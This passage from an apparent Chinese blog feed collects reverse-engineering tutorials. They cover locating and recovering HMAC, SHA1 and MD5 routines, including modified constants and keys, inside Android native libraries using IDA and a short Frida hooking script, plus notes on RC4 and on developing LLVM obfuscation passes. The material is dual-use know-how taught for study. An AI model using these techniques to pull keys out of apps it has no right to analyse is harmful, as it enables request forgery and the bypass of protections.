    <content type="html"><![CDATA[<h1 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>RC4算法主要有两个算法构成，一个是初始化算法（KSA），还有一个是伪随机子密码生成算法（PRGA）</p><p><img src="https://s2.loli.net/2022/02/11/sg2PYmUJLtMQfkA.png" alt="Untitled"></p><p>KSA算法部分，参数1是一个长度为256的char数组，参数2是密钥，可以任意定义，参数3是密钥的长度，密钥的主要功能是将s-box打乱</p><p><img src="https://s2.loli.net/2022/02/11/hYlXEuRKs2q8cez.png" alt="Untitled"></p><p>PRGA算法，参数1是被打乱的s-box，参数2是需要加密的数据</p><p><img src="https://s2.loli.net/2022/02/11/Z1xzkGXUrbIfYn5.png" alt="Untitled"></p><h2 id="RC4加密算法的识别"><a href="#RC4加密算法的识别" class="headerlink" title="RC4加密算法的识别"></a>RC4加密算法的识别</h2><p>1、RC4算法加密的字符串有一个特点，明文和密文长度相等</p><p>2、逆向算法，找到KSA算法，有两轮非常明显的长度为256的循环体</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RC4算法&quot;&gt;&lt;a href=&quot;#RC4算法&quot; class=&quot;headerlink&quot; title=&quot;RC4算法&quot;&gt;&lt;/a&gt;RC4算法&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@HMAC算法逆向与还原</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@HMAC%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@HMAC%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/</id>
    <published>2022-02-11T06:57:37.000Z</published>
    <updated>2022-02-11T06:58:04.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HMAC算法逆向与还原"><a href="#HMAC算法逆向与还原" class="headerlink" title="HMAC算法逆向与还原"></a>HMAC算法逆向与还原</h1><h2 id="HMAC算法还原"><a href="#HMAC算法还原" class="headerlink" title="HMAC算法还原"></a>HMAC算法还原</h2><p>HMAC有一个key，并且可以选择多种不同的哈希算法</p><p>目标程序对字符串进行加密，算法是HMAC</p><p><img src="https://s2.loli.net/2022/02/11/dwgu7GhSn4RkxEV.png" alt="Untitled"></p><p>核心加密函数，传递了一个字符串kanxue_imyang</p><p><img src="https://s2.loli.net/2022/02/11/Z728GloLjqYsNn4.png" alt="Untitled"></p><p>翻算法找到常量</p><p><img src="https://s2.loli.net/2022/02/11/vpjFLcUTuQ4Y6rC.png" alt="Untitled"></p><p>然后google搜到算法源码，根据源码可以知道这个函数是md5_transform</p><p><img src="https://s2.loli.net/2022/02/11/tA7gdIKsjTu864M.png" alt="Untitled"></p><p>它的上级函数是md5_update</p><p><img src="https://s2.loli.net/2022/02/11/MJke5gPATpEUcKu.png" alt="Untitled"></p><p>地址是0xaf84</p><p><img src="https://s2.loli.net/2022/02/11/CURcih9sAHrJV6y.png" alt="Untitled"></p><p>对md5_update函数进行hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    var base_native_lib = Module.findBaseAddress(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">&quot;base_native_lib address:&quot;</span>,base_native_lib);</span><br><span class="line">    var md5_update = base_native_lib.add(<span class="number">0xAF84</span> + <span class="number">1</span>);</span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">&quot;md5_update address:&quot;</span>,md5_update);</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(md5_update,&#123;</span><br><span class="line">        onEnter : function(args)&#123;</span><br><span class="line">            console.<span class="built_in">log</span>(<span class="string">&quot;md5_update:&quot;</span>,hexdump(args[<span class="number">1</span>],&#123;length : parseInt(args[<span class="number">2</span>])&#125;),args[<span class="number">0</span>]);</span><br><span class="line">        &#125;,onLeave : function(retval)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setTimeout(test,<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>每次加密都会调用8次md5_update函数 </p><p><img src="https://s2.loli.net/2022/02/11/YQLyX6a9t3RF45H.png" alt="Untitled"></p><p>打印一下md5_update调用堆栈，大部分上层函数都指向了0xb738</p><p>接着hook sub_b738</p><p><img src="https://s2.loli.net/2022/02/11/j8BO6CbxMVthdSy.png" alt="Untitled"></p><p>hexdump打印一下sub_b738的内存，可以看到sub_b738的参数的值，每次执行算法时都会调用两次sub_b738函数 </p><p><img src="https://s2.loli.net/2022/02/11/dDt1RmsvX2nFQT7.png" alt="Untitled"></p><p>第二次</p><p><img src="https://s2.loli.net/2022/02/11/5VeKRdbH2oUh3XD.png" alt="Untitled"></p><p>把上面两次md5_update传递的字符串进行拼接再进行md5运算，结果跟第二次调用sub_b738时的第一个参数是一致的</p><p><img src="https://s2.loli.net/2022/02/11/IRm2HQk93UxGq6E.png" alt="Untitled"></p><p>hook最上级函数sub_b9f4，在OnLeave的时候看下传出来的值</p><p><img src="https://s2.loli.net/2022/02/11/1Tce3rpG9luvRE7.png" alt="Untitled"></p><p>hook这几个参数发现跟ida的反编译结果不太一样，根据打印的值猜测前面是字符串，后面是长度</p><p><img src="https://s2.loli.net/2022/02/11/hNYUayKuIRsAEzD.png" alt="Untitled"></p><p>所以可以打印3组数据 </p><p><img src="https://s2.loli.net/2022/02/11/VQLJuh1ti7w4Co2.png" alt="Untitled"></p><p>第一组数据是4e704c….</p><p>第二组数据是kanxue_imyang</p><p>第三组数据是4498220e，这个字符串跟加密的字符串是一致的</p><p><img src="https://s2.loli.net/2022/02/11/XmuliQHvAbhItFR.png" alt="Untitled"></p><p>所以最后一个参数应该就是加密的字符串了</p><p><img src="https://s2.loli.net/2022/02/11/kFKogC7WayQZrOR.png" alt="Untitled"></p><p>进入sub_b9f4函数可以看到result_buffer调用的地方</p><p><img src="https://s2.loli.net/2022/02/11/y9vEBGsSfHdVihu.png" alt="Untitled"></p><p>接着hook sub_b738，此时对应的加密字符串是82900068….</p><p>进入sub_b738时</p><p><img src="https://s2.loli.net/2022/02/11/fPXLdhk2BzH6ulA.png" alt="Untitled"></p><p>可以看到进入sub_b738函数前，有两次md5_update，第二次md5_update的值跟sub_b738第一个参数是一样的</p><p><img src="https://s2.loli.net/2022/02/11/MTR7XH3SApqt2fK.png" alt="Untitled"></p><p>把这两次md5_update传递的字符串拼接到一起然后进入md5运算，得到的值就是最终的加密字符串了</p><p><img src="https://s2.loli.net/2022/02/11/y8AHCUlsf6zeQL2.png" alt="Untitled"></p><p>在sub_b738函数内部又执行了两次md5_update</p><p><img src="https://s2.loli.net/2022/02/11/8twiFBpXHQ5jOKA.png" alt="Untitled"></p><p>执行完sub_b738时，可以看到执行完时就已经是加密后的字符串了</p><p><img src="https://s2.loli.net/2022/02/11/9Z7Ngn3wtxuFzyi.png" alt="Untitled"></p><p>两次md5_update然后执行sub_b738，这两次md5_update拼接的值是最终加密的字符串，在sub_b738内部又调用了两次md5_update，然后执行完毕，加密完成</p><p>其实源字符串通过hmac加密,key设置为kanxue_imyang结果跟上面是一样的，所以对于hmac加密只要找到key就可以了</p><p><img src="https://s2.loli.net/2022/02/11/b7fc89HmtqTveKh.png" alt="Untitled"></p><p>HMAC算法内部对key进行了异或之类的处理，处理之后的值再进行md5_update，也就是说HMAC算法不是仅仅进行了md5_update盐字符串拼接源字符串再进行哈希，还会对md5_update盐字符串进行处理，然后再拼接源字符串，最后进行哈希</p><h2 id="魔改异或值HMAC算法还原"><a href="#魔改异或值HMAC算法还原" class="headerlink" title="魔改异或值HMAC算法还原"></a>魔改异或值HMAC算法还原</h2><p>hook sub_1470c，可以看到key，不过通过HMAC算法对源字符串进行加密得出的结果跟最终加密的结果不一致，说明算法进行了魔改，最终的加密结果放在最后一个参数中了</p><p><img src="https://s2.loli.net/2022/02/11/Sw2gHYCRkz6AyF8.png" alt="Untitled"></p><p>对着参数按x，找到所有引用</p><p><img src="https://s2.loli.net/2022/02/11/Xa5CxySQc1O7NFu.png" alt="Untitled"></p><p>先进入sub_11DF0查看，根据内部的特征很有可能就是md5_transform</p><p><img src="https://s2.loli.net/2022/02/11/k3uYtUeOKPZpQDl.png" alt="Untitled"></p><p>它的上层函数就是md5_update</p><p><img src="https://s2.loli.net/2022/02/11/hjdm2PACRZgXws7.png" alt="Untitled"></p><p>hook md5_update</p><p><img src="https://s2.loli.net/2022/02/11/qRZMGh8F3u4UYkP.png" alt="Untitled"></p><p>可以看到md5_update的参数如下</p><p><img src="https://s2.loli.net/2022/02/11/xeodSYA7OwpL4Ur.png" alt="Untitled"></p><p>没有进行魔改的HMAC算法md5_udpate的参数是这样的，有大量的0x36</p><p><img src="https://s2.loli.net/2022/02/11/jtWeMVHB87pnfSq.png" alt="Untitled"></p><p>可以看到算法内部跟0x36异或的操作</p><p><img src="https://s2.loli.net/2022/02/11/ey4TJPqNOKBGh3X.png" alt="Untitled"></p><p>跟0x36异或算出来的结果就是Key</p><p><img src="https://s2.loli.net/2022/02/11/xIGlQucy3fOwKg4.png" alt="Untitled"></p><p>所以这个魔改的算法，修改了异或的值，把它跟0x88进行异或可以还原key</p><p><img src="https://s2.loli.net/2022/02/11/hUINW4fcgqteES3.png" alt="Untitled"></p><p>进行算法还原也很容易，找到HMAC的实现代码，把异或的值修改一下就可以了 </p><h2 id="HMAC-SHA256算法还原"><a href="#HMAC-SHA256算法还原" class="headerlink" title="HMAC-SHA256算法还原"></a>HMAC-SHA256算法还原</h2><p>sub_14D68函数的参数传递了一个缓冲区</p><p><img src="https://s2.loli.net/2022/02/11/rBd2RSuxLQ6kbz7.png" alt="Untitled"></p><p>打印看一下发现是kanxue_imgyang_52，因此这个函数应该就是核心算法函数 </p><p><img src="https://s2.loli.net/2022/02/11/HQufiqovYgS1ZJF.png" alt="Untitled"></p><p>进入函数因为有混淆，所以跟踪第一个参数的调用情况，然后找到了一些常量，google后确认是sha256</p><p><img src="https://s2.loli.net/2022/02/11/RdUceilgrypYk24.png" alt="Untitled"></p><p>根据源码可以确认sub_15194就是sha256_init函数</p><p><img src="https://s2.loli.net/2022/02/11/VHYv5wQW6muOlLB.png" alt="Untitled"></p><p>回到上一层，可以确认sha256_init的参数来自于sub_15148的参数 </p><p><img src="https://s2.loli.net/2022/02/11/hWMcSfZFIGdK7Dq.png" alt="Untitled"></p><p>最终可以确认sub_14d68的第一个参数是sha256_ctx</p><p><img src="https://s2.loli.net/2022/02/11/NTFQOXquaADWhKl.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/cw6SloTr4KIG7py.png" alt="Untitled"></p><p>接着分析sub_9598，在里面找到常量，google一番找到标准算法搜索后看到是数组k里面的元素</p><p><img src="https://s2.loli.net/2022/02/11/3Lv6H5VowycksKx.png" alt="Untitled"></p><p>看到k在sha256_transform内部进行了引用 </p><p><img src="https://s2.loli.net/2022/02/11/1raQMfqB5d7pAEk.png" alt="Untitled"></p><p>因此这个函数就是sha256_transform</p><p><img src="https://s2.loli.net/2022/02/11/mpORoeUc4dy7l3X.png" alt="Untitled"></p><p>查源码sha256_transform的上一层是sha256_update</p><p><img src="https://s2.loli.net/2022/02/11/5yIsP34EvOeNJxH.png" alt="Untitled"></p><p>因此sub_9598的内部调用的是sha256_update</p><p><img src="https://s2.loli.net/2022/02/11/uSXTOJ1kLChsxQV.png" alt="Untitled"></p><p>对sha256_update进行hook</p><p><img src="https://s2.loli.net/2022/02/11/NQPO5ozZBLxgfeu.png" alt="Untitled"></p><p>对sub_15030进行hook</p><p><img src="https://s2.loli.net/2022/02/11/tBclgqS3WjZI58M.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/6Hex9YQtTS3UuFa.png" alt="Untitled"></p><p>可以通过打印参数获取地址，可以分辨是不是同一个sha256_update</p><p><img src="https://s2.loli.net/2022/02/11/XM1zP85dsq9KCGp.png" alt="Untitled"></p><p>两个md5_update拼接生成3b999….</p><p><img src="https://s2.loli.net/2022/02/11/seSVZGIfkvmhObn.png" alt="Untitled"></p><p>再两次md5_update拼接生成最终加密字符串</p><p><img src="https://s2.loli.net/2022/02/11/clpKr4tzX8Af2WZ.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/yPV9zpWo54CvwDF.png" alt="Untitled"></p><p>7=2$…字符串是key跟0x5c异或的结果，通过跟0x5c异或可以还原key</p><p><img src="https://s2.loli.net/2022/02/11/ydLZEYqSHkrw79t.png" alt="Untitled"></p><p>通过key生成加密字符串</p><p><img src="https://s2.loli.net/2022/02/11/1o9CqjtmZRIOYEH.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HMAC算法逆向与还原&quot;&gt;&lt;a href=&quot;#HMAC算法逆向与还原&quot; class=&quot;headerlink&quot; title=&quot;HMAC算法逆向与还原&quot;&gt;&lt;/a&gt;HMAC算法逆向与还原&lt;/h1&gt;&lt;h2 id=&quot;HMAC算法还原&quot;&gt;&lt;a href=&quot;#HMAC算法还原&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@SHA1算法逆向与还原</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@SHA1%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@SHA1%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/</id>
    <published>2022-02-11T06:51:37.000Z</published>
    <updated>2022-02-11T06:51:30.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SHA1算法逆向与还原"><a href="#SHA1算法逆向与还原" class="headerlink" title="SHA1算法逆向与还原"></a>SHA1算法逆向与还原</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>sha1算法加密后的字符串长度是40位，sha256长度是64位</p><h2 id="一般sha1算法还原"><a href="#一般sha1算法还原" class="headerlink" title="一般sha1算法还原"></a>一般sha1算法还原</h2><p>目标程序加密结果跟SHA1算法对不上</p><p><img src="https://s2.loli.net/2022/02/11/Lg8UjlFRhq2X4GE.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/mMAb8kfg1hQFePI.png" alt="Untitled"></p><p>看下伪代码，SHA1算法跟MD5是类似的，也会用调用SHA1Update函数  </p><p><img src="https://s2.loli.net/2022/02/11/GOk1WbZ6itMNxhm.png" alt="Untitled"></p><p>把盐字符串拼接上就对了</p><p><img src="https://s2.loli.net/2022/02/11/MlmW4afo79H2Jp3.png" alt="Untitled"></p><h2 id="SHA1Init常量变形还原"><a href="#SHA1Init常量变形还原" class="headerlink" title="SHA1Init常量变形还原"></a>SHA1Init常量变形还原</h2><p>运行目标程序，发现加密跟标准sha1对不上</p><p><img src="https://s2.loli.net/2022/02/11/7SdH6eTbUVpD2Er.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/PBh4l57VRfKEISz.png" alt="Untitled"></p><p>看下伪代码，发现SHA1Init函数中的常量跟标准SHA1算法不一样了，把标准SHA1算法代码中的常量替换成目标程序中的SHA1常量进行还原</p><p><img src="https://s2.loli.net/2022/02/11/usIrEDJkvlQHoCp.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/OrZhUpVjyRD2lGw.png" alt="Untitled"></p><p>把开源的sha1源码拷贝到Clion，把常量修改一下进行调用就可以实现算法还原工具了</p><p><img src="https://s2.loli.net/2022/02/11/beXuR6lZ95afTY3.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/ZnMyHhiwK3AFatk.png" alt="Untitled"></p><h2 id="SHA1Transform变形还原"><a href="#SHA1Transform变形还原" class="headerlink" title="SHA1Transform变形还原"></a>SHA1Transform变形还原</h2><p>逆向SHA1Init里的常量保存一致，SHA1Update的盐字符串也一致，结果却不一样，可以考虑是SHA1Transform函数的常量值被替换了</p><p>SHA1Transform是SHA1Update函数内部的一个函数，里面有很多常量参与运算，找出所有的常量再在标准算法里比对（也可以通过脚本进行筛查）</p><p>SHA1算法里的k1-k4就是transform里面的几个常量</p><p><img src="https://s2.loli.net/2022/02/11/fxPoqDUZE8dSls6.png" alt="Untitled"></p><p>如果有不一致的地方修改回来，再编写算法还原工具</p><h2 id="SHA1Update字符串OLLVM混淆"><a href="#SHA1Update字符串OLLVM混淆" class="headerlink" title="SHA1Update字符串OLLVM混淆"></a>SHA1Update字符串OLLVM混淆</h2><p>可以看到这里字符串变成一个变量了</p><p><img src="https://s2.loli.net/2022/02/11/t5gJAh38wxTWC9N.png" alt="Untitled"></p><p>查看这几个变量的交叉引用会跟踪到非常复杂的混淆</p><p><img src="https://s2.loli.net/2022/02/11/GxM2ZbIzWTUlK5X.png" alt="Untitled"></p><p>对于这种情况可以通过frida hook这个变量地址直接打印出字符串再代入到算法工具中进行算法还原</p><p><img src="SHA1%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F%20318b528f70494ee78f6f5c4b63619467/Untitled%2013.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SHA1算法逆向与还原&quot;&gt;&lt;a href=&quot;#SHA1算法逆向与还原&quot; class=&quot;headerlink&quot; title=&quot;SHA1算法逆向与还原&quot;&gt;&lt;/a&gt;SHA1算法逆向与还原&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ollvm@pass开发</title>
    <link href="https://tutucoo.github.io/2022/02/11/ollvm@pass%E5%BC%80%E5%8F%91/"/>
    <id>https://tutucoo.github.io/2022/02/11/ollvm@pass%E5%BC%80%E5%8F%91/</id>
    <published>2022-02-11T06:51:37.000Z</published>
    <updated>2022-02-11T07:24:23.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pass开发"><a href="#pass开发" class="headerlink" title="pass开发"></a>pass开发</h1><h2 id="在llvm源码之外开发pass"><a href="#在llvm源码之外开发pass" class="headerlink" title="在llvm源码之外开发pass"></a>在llvm源码之外开发pass</h2><p>创建下面几个文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211H0mGNS.png" alt="Untitled"></p><p>根目录下的CMakeLists.txt文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211PG01ap.png" alt="Untitled"></p><p>EncodeFuctionName目录下的CMakeLists.txt</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211G6hiA7.png" alt="Untitled"></p><p>然后用CLion打开，有报错，解决报错</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211qwg45s.png" alt="Untitled"></p><p>修改根目录下CMakeLists.txt</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211QnFj3W.png" alt="Untitled"></p><p>还缺这两个文件 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211J2nV4H.png" alt="Untitled"></p><p>llvm编译目录下进行搜索找到这两个文件 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211MDJwlf.png" alt="Untitled"></p><p>获取完整路径 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211wGNg87.png" alt="Untitled"></p><p>设置llvm目录</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211dYhlQ3.png" alt="Untitled"></p><p>再声明子目录</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202113viXB2.png" alt="Untitled"></p><p>如果重名报错修改一下文件夹名称就可以了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211lbu08J.png" alt="Untitled"></p><p>这里添加一个release就可以编译一个release版本</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202111jM2ro.png" alt="Untitled"></p><p>编译好之后会生成LLVMEncodeFunctionname2.so文件，使用opt指令就可以进行使用了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Jfrl48.png" alt="Untitled"></p><h2 id="注册pass"><a href="#注册pass" class="headerlink" title="注册pass"></a>注册pass</h2><p>每次加载pass要指定绝对路径还是比较麻烦的，可以通过注册pass，这样就不用每次指定绝对路径</p><p>找到include目录 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211ez0Cpo.png" alt="Untitled"></p><p>创建一个头文件 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211x8zKnx.png" alt="Untitled"></p><p>创建一个接口</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/2022021105Iwac.png" alt="Untitled"></p><p>包含头文件 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211jLkgG5.png" alt="Untitled"></p><p>在EncodeFunctionName.cpp实现该接口</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211hA9Jui.png" alt="Untitled"></p><p>添加一些实现</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211gmCZYu.png" alt="Untitled"></p><p>判断一下</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211WPKlkD.png" alt="Untitled"></p><p>找到PassManagerBuilder.cpp添加EncodeFunctionName.h头文件 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211R9qBBu.png" alt="Untitled"></p><p>在CMakeLists.txt中添加下面的指令以便编译成静态库</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211e8qksM.png" alt="Untitled"></p><p>在llvm/lib/Transforms/LLVMBuild.txt中添加到common中</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211QEuDMr.png" alt="Untitled"></p><p>llvm/lib/Transforms/IPO/LLVMBuild.txt中也要添加</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202118icuDM.png" alt="Untitled"></p><p>创建LLVMBuild.txt文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211gzStrj.png" alt="Untitled"></p><p>添加参数</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211hiIyhW.png" alt="Untitled"></p><p>还是在PassManagerBuilder.cpp中添加代码，如果命令执行时有参数就会执行这个pass</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Uodg9n.png" alt="Untitled"></p><p>然后执行ninja LLVMEncodeFunctionName单独进行编译</p><p>再编译clang工具 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211rlLL9G.png" alt="Untitled"></p><p>这时就可以把自定义的pass当作参数传递进去进行编译了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211VXO978.png" alt="Untitled"></p><h2 id="在llvm源码外调试pass"><a href="#在llvm源码外调试pass" class="headerlink" title="在llvm源码外调试pass"></a>在llvm源码外调试pass</h2><p>这里路径修改为debug版本的 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211DAhDrB.png" alt="Untitled"></p><p>找到opt的绝对路径</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211FXKcLY.png" alt="Untitled"></p><p>在CLion中进行指定</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202115TFRTJ.png" alt="Untitled"></p><p>参数填写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-load pass绝对路径 -pass参数 ll文件绝对路径</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202111XiJbD.png" alt="Untitled"></p><p>然后在runOnFunction里面下断点进行调试</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211LqqAv5.png" alt="Untitled"></p><h2 id="clang加载pass"><a href="#clang加载pass" class="headerlink" title="clang加载pass"></a>clang加载pass</h2><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211tD3Wva.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pass开发&quot;&gt;&lt;a href=&quot;#pass开发&quot; class=&quot;headerlink&quot; title=&quot;pass开发&quot;&gt;&lt;/a&gt;pass开发&lt;/h1&gt;&lt;h2 id=&quot;在llvm源码之外开发pass&quot;&gt;&lt;a href=&quot;#在llvm源码之外开发pass&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@MD5算法逆向与还原</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@MD5%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@MD5%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/</id>
    <published>2022-02-11T06:47:37.000Z</published>
    <updated>2022-02-11T06:47:51.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MD5算法逆向与还原"><a href="#MD5算法逆向与还原" class="headerlink" title="MD5算法逆向与还原"></a>MD5算法逆向与还原</h1><h2 id="算法的识别"><a href="#算法的识别" class="headerlink" title="算法的识别"></a>算法的识别</h2><p>md5算法很好识别，一般会先调用MD5Init，然后调用MD5Update，最后调用MD5Final，这里多次调用md5update，实际上完成的是字符串的加盐</p><p>如果不是很确定，可以先google搜索MD5Init那里的常量，一般可以搜索到算法</p><p><img src="https://s2.loli.net/2022/02/11/P7VRm2bgYkOeiQH.png" alt="Untitled"></p><h2 id="MD5算法还原"><a href="#MD5算法还原" class="headerlink" title="MD5算法还原"></a>MD5算法还原</h2><p>google搜md5.c，找到MD5的实现，编写算法还原工具，需要注意MD5Init的常量需要逆向获得</p><h2 id="混淆的MD5算法还原"><a href="#混淆的MD5算法还原" class="headerlink" title="混淆的MD5算法还原"></a>混淆的MD5算法还原</h2><p>对于混淆的算法，直接硬看一般什么也看不出来，不过可以通过参数引用来进行逆向分析</p><p>这个jni函数只有一个参数，类型是一个字符串，源字符串通过这个参数传递进来，我们把它重命名为input</p><p><img src="https://s2.loli.net/2022/02/11/SoYUZGWs7dckjLX.png" alt="Untitled"></p><p>查看它的交叉引用</p><p><img src="https://s2.loli.net/2022/02/11/PUIgjzAxS4pJGyt.png" alt="Untitled"></p><p>查看第一处input引用，通过v15传参，接着可以分析v15的引用情况，同时发现v15返回值是s，返回值也要关注，这里sub_F794传递了v15和s，所以可以通过frida hook并用hexdump观察内存中的字节码进行分析</p><p><img src="https://s2.loli.net/2022/02/11/ubFiv6GrXlHpRYc.png" alt="Untitled"></p><p>最终定位到关键函数，再找到MD5Update的位置，hook参数，查看这些参数字符串，将这些参数字符串拼接代入到md5算法中如果结果一致就可以编写还原工具了</p><p><img src="https://s2.loli.net/2022/02/11/ANbr6P4xtyG3Lip.png" alt="Untitled"></p><h2 id="深度修改MD5算法还原"><a href="#深度修改MD5算法还原" class="headerlink" title="深度修改MD5算法还原"></a>深度修改MD5算法还原</h2><p>有些MD5算法即使hook到MD5Update传递的加盐字符串，算出的结果仍然不一致，这种情况就很有可能是动了md5的transform</p><p><img src="https://s2.loli.net/2022/02/11/HIPoiG5WbJNsBAp.png" alt="Untitled"></p><p>transform函数里面非常复杂，也有非常多的常量，可以在google搜索到包含这些常量的源文件，然后找到这些常量</p><p><img src="https://s2.loli.net/2022/02/11/eomnxTwAyXf9Cig.png" alt="Untitled"></p><p>接着通过动态trace指令，把目标函数所有指令trace下来，里面必然包含了这些常量，最后写脚本比对不存在的常量，那么不存在的常量就是被修改的，在trace文件中找到被修改的常量，然后patch md5算法，就可以实现算法还原工具了 </p><p><img src="https://s2.loli.net/2022/02/11/oYV9NsnSEkh5rLd.png" alt="Untitled"></p><p>这里缺少的常量是下面两个</p><p><img src="https://s2.loli.net/2022/02/11/aAdrLZD9qkcUO1f.png" alt="Untitled"></p><p>缺少的常量在代码中的位置 </p><p><img src="https://s2.loli.net/2022/02/11/YxT4iBVlfaqs8Hk.png" alt="Untitled"></p><p>可以先找到在它前面的常量0xfd469501，+CCC地址是处理这个常量的地址，执行到这里时x10里面保存的值是0xfd469501</p><p><img src="https://s2.loli.net/2022/02/11/uHqs8X3d4CZ7Umi.png" alt="Untitled"></p><p>在ida中定位到位置</p><p><img src="https://s2.loli.net/2022/02/11/hrOW1zMovw2gibe.png" alt="Untitled"></p><p><img src="https://s2.loli.net/2022/02/11/3lufRvB2jkOp8tG.png" alt="Untitled"></p><p>4249261313转换为16进制就是常量0xfd469501</p><p><img src="https://s2.loli.net/2022/02/11/VpAR3uHM5S2Pw6f.png" alt="Untitled"></p><p>那么它的下一个常量可能就是修改过的常量了</p><p><img src="https://s2.loli.net/2022/02/11/k9QYq8ZmBjhsGlp.png" 